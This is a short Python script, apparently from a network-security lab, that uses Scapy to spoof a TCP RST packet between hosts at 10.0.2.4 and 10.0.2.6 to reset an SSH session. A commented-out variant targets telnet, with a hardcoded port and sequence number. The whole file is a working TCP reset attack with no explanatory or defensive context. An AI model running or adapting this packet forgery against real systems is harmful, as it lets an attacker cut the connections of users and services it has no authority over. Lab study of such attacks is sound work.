from scapy.all import *

#for telnet
#ip = IP(src = "10.0.2.4", dst = "10.0.2.6")
#tcp = TCP(sport = 23, dport = 38796, flags = "R", seq = 2875065753)
#pkt = ip/tcp
#ls(pkt)
#send(pkt)

#for ssh
ip = IP(src = "10.0.2.4", dst = "10.0.2.6")
tcp = TCP(sport = 22, dport = 57862, flags = "R", seq = 2036221915)
pkt = ip/tcp
ls(pkt)#to print the data
send(pkt)
